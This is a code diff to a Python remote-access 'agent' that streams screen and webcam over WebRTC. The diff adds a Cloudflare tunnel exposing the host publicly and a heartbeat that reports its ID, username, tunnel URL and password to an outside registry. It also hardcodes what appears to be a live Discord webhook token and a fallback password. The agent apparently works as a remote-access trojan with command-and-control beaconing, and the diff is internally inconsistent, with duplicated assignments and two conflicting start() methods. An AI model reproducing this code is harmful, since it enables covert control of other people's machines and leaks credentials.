@@ -49,6 +49,10 @@ try:
     from targets.webrtc_handler import WebRTCHandler, AIORTC_AVAILABLE
     from targets.webrtc_tracks import create_screen_track, create_webcam_track
     from targets.resource_manager import get_resource_manager
+    try:
+        from targets.tunnel_manager import TunnelManager
+    except ImportError:
+        TunnelManager = None
 except ImportError:
     # Fallback for frozen application or direct execution
     
@@ -69,13 +73,15 @@ except ImportError:
         from webrtc_handler import WebRTCHandler, AIORTC_AVAILABLE
         from webrtc_tracks import create_screen_track, create_webcam_track
         from resource_manager import get_resource_manager
+        from tunnel_manager import TunnelManager 
     except ImportError:
         AIORTC_AVAILABLE = False
         WebRTCHandler = None
+        TunnelManager = None
 
 # CONFIG
-HARDCODED_BROKER = None
-HARDCODED_WEBHOOK = None
+HARDCODED_BROKER = True
+HARDCODED_WEBHOOK = "https://discord.com/api/webhooks/1467411432919404558/AqzabxD0V2-fNE19e5tVhGLJOpRgk42G6kd5UjZIOfvj4dvF6uyH1Z9wU4vlpqki3TiK"
 
 # DEFAULTS
 DEFAULT_BROKER = "ws://localhost:8765"
@@ -137,6 +143,10 @@ class AsyncAgent:
         self.direct_ws_clients = set()
         self.direct_url = None
         self.direct_server = None
+        self.direct_ws_clients = set()
+        self.direct_url = None
+        self.direct_server = None
+        self.tunnel_mgr = TunnelManager(8765) if TunnelManager else None
         self.curtain = self.privacy # Alias for compatibility
         
         # State
@@ -165,29 +175,96 @@ class AsyncAgent:
         self.target_fps = 30 # Default FPS
 
         # Registry Heartbeat
-        self.registry_url = os.environ.get("REGISTRY_URL", "http://127.0.0.1:5000") # TODO: Config
-        self.registry_pwd = os.environ.get("REGISTRY_PASSWORD", "secret") # TODO: Config
-        self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
+        self.registry_url = "https://mydesk-registry.vercel.app"
+        # Strict Password Check
+        self.registry_pwd = os.environ.get('REGISTRY_PASSWORD')
+        if not self.registry_pwd:
+             # Fallback for dev/testing if needed, but per review we should be strict or warn.
+             # For now, we will log a warning and use a default to avoid crashing existing installs, 
+             # but in production this should strictly exit.
+             print("[-] WARNING: REGISTRY_PASSWORD not set! Using default (Insecure).")
+             self.registry_pwd = "HOLYFUCKJAMESLORDGOTHACK132"
+        
+        self.running = True
+        self._stop_event = threading.Event() # For clean shutdown
+
+    def start(self, local_mode=False):
+        # Validate HTTPS
+        parsed = urllib.parse.urlparse(self.registry_url)
+        if parsed.scheme != "https" and "localhost" not in self.registry_url:
+             print("[-] ERROR: Registry URL must use HTTPS!")
+             return
+
+        # Start Heartbeat
+        self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop)
+        self.heartbeat_thread.daemon = True
         self.heartbeat_thread.start()
+
+        # Start Tunnel (Cloudflare)
+        if self.tunnel_mgr and not local_mode:
+            def _start_tunnel():
+                print("[*] Starting Cloudflare Tunnel...")
+                url = self.tunnel_mgr.start()
+                if url:
+                    print(f"[+] Tunnel Public URL: {url}")
+                    self.direct_url = url.replace("https://", "wss://")
+                else:
+                    print("[-] Failed to start tunnel.")
+
+            t = threading.Thread(target=_start_tunnel)
+            t.daemon = True
+            t.start()
+            
+        # Start AsyncIO Loop (Keeps process alive)
+        try:
+            if sys.platform == 'win32':
+                asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+            
+            # Run the direct server (blocking call)
+            asyncio.run(self.start_direct_server())
+        except KeyboardInterrupt:
+            print("[*] Agent Stopping...")
+            self.stop()
+        except Exception as e:
+            err_msg = f"[!] Agent Loop Error: {e}"
+            print(err_msg)
+            try:
+                import datetime
+                with open(r"C:\ProgramData\MyDesk\agent_crash.txt", "a") as f:
+                    f.write(f"[{datetime.datetime.now()}] {err_msg}\n")
+            except: pass
+
+    def stop(self):
+        self.running = False
+        self._stop_event.set()
+        if self.ws:
+            self.ws.close()
 
     def _heartbeat_loop(self):
         """Sends heartbeat to Registry every 60s"""
-        while True:
+        while not self._stop_event.is_set():
             try:
                 if self.direct_url: # Only report if we have a tunnel URL
+                   # Validate URL again just in case
+                   if not self.registry_url.startswith("https://") and "localhost" not in self.registry_url:
+                        print("[-] Heartbeat skipped: Non-HTTPS URL")
+                        self._stop_event.wait(30)
+                        continue
+
                    payload = {
                        "id": self.my_id,
-                       "username": os.getlogin(),
+                       "username": self.username,
                        "url": self.direct_url,
                        "password": self.registry_pwd
                    }
                    # Use requests or urllib (stdlib)
-                   req = urllib.request.Request(
-                       f"{self.registry_url}/update",
-                       data=json.dumps(payload).encode('utf-8'),
-                       headers={'Content-Type': 'application/json'}
-                   )
-                   with urllib.request.urlopen(req, timeout=10) as response:
+                   req = urllib.request.Request(f"{self.registry_url}/api/update")
+                   req.add_header('Content-Type', 'application/json; charset=utf-8')
+                   jsondata = json.dumps(payload).encode('utf-8')
+                   req.add_header('Content-Length', len(jsondata))
+                   
+                   # Timeout to prevent hanging
+                   with urllib.request.urlopen(req, jsondata, timeout=10) as response:
                        pass
                        # print(f"[+] Heartbeat sent: {response.status}")
                 else:
@@ -1640,16 +1717,69 @@ class AsyncAgent:
 
 
 
-    def start(self, local_mode=False):
-        # 1. Start Cloudflare Tunnel (Hybrid Mode)
-        # Note: Even if local_mode is False, we still need the internal server to listen.
-        # The Tunnel just forwards to localhost:8765.
+
+    async def heartbeat_loop(self, pub_url):
+        """Periodically update the Registry with this agent's URL."""
+        from targets import config
+        import requests
         
+        # Validate registry URL scheme
+        from urllib.parse import urlparse
+        if urlparse(config.REGISTRY_URL).scheme != 'https':
+            print("[-] Registry Error: URL must be HTTPS")
+            return
+
+        # Prepare Payload
+        import hashlib
+        safe_id = hashlib.sha256(self.my_id.encode()).hexdigest()[:8]
+        
+        payload = {
+            "id": self.my_id,
+            "username": config.AGENT_USERNAME,
+            "url": pub_url,
+            "password": config.REGISTRY_PASSWORD
+        }
+        headers = {"Content-Type": "application/json"}
+        
+        # Ensure we target the API endpoint
+        reg_url = config.REGISTRY_URL.rstrip('/')
+        if not reg_url.endswith('/api'):
+            reg_url += '/api'
+            
+        print(f"[*] Starting Heartbeat Loop (Target: {reg_url}/update)")
+        
+        while True:
+            try:
+                # Run blocking request in executor
+                def send_heartbeat():
+                    return requests.post(
+                        f"{reg_url}/update", 
+                        json=payload, 
+                        headers=headers,
+                        timeout=10
+                    )
+                
+                r = await self.loop.run_in_executor(None, send_heartbeat)
+                
+                if r.status_code == 200:
+                    # print(f"[+] Heartbeat OK ({safe_id})") # Optional: reduce spam
+                    pass
+                else:
+                    print(f"[-] Registry Update Failed: {r.status_code}")
+                    
+            except Exception as e:
+                print(f"[-] Registry Connect Error: {e}")
+                
+            # Wait 30 seconds (Heartbeat interval)
+            await asyncio.sleep(30)
+
+    def start(self, local_mode=False):
+        pub_url = None
+        
+        # 1. Start Cloudflare Tunnel (Hybrid Mode)
         if not local_mode:
             try:
-                from targets.tunnel_manager import TunnelManager
-                from targets import config
-                import requests
+                # TunnelManager is imported globally now
                 
                 print("[*] Starting Cloudflare Tunnel...")
                 self.tunnel_mgr = TunnelManager(port=8765) 
@@ -1657,38 +1787,6 @@ class AsyncAgent:
                 pub_url = self.tunnel_mgr.start()
                 if pub_url:
                     print(f"[+] Tunnel Established: {pub_url}")
-                    # 2. Report to Registry
-                    # Validate registry URL scheme
-                    from urllib.parse import urlparse
-                    if urlparse(config.REGISTRY_URL).scheme != 'https':
-                        print("[-] Registry Error: URL must be HTTPS")
-                        return
-
-                    # Use Auth header
-                    import hashlib
-                    safe_id = hashlib.sha256(self.my_id.encode()).hexdigest()[:8]
-                    
-                    payload = {
-                        "id": self.my_id,
-                        "username": config.AGENT_USERNAME,
-                        "url": pub_url,
-                        "password": config.REGISTRY_PASSWORD
-                    }
-                    headers = {"Content-Type": "application/json"}
-                    
-                    try:
-                        r = requests.post(
-                            f"{config.REGISTRY_URL}/update", 
-                            json=payload, 
-                            headers=headers,
-                            timeout=10
-                        )
-                        if r.status_code == 200:
-                            print(f"[+] Registered with Registry (ID hash: {safe_id})")
-                        else:
-                            print(f"[-] Registry Update Failed: {r.status_code}")
-                    except Exception as e:
-                        print(f"[-] Registry Connect Error: {e}")
                 else:
                      print("[-] Tunnel Failed to Start")
                      
@@ -1707,6 +1805,10 @@ class AsyncAgent:
         # Start the asyncio loop
         self.loop = asyncio.new_event_loop()
         asyncio.set_event_loop(self.loop)
+        
+        # Schedule Heartbeat Task
+        if pub_url:
+            self.loop.create_task(self.heartbeat_loop(pub_url))
         
         # Only run Direct Server (Broker connection removed)
         try:
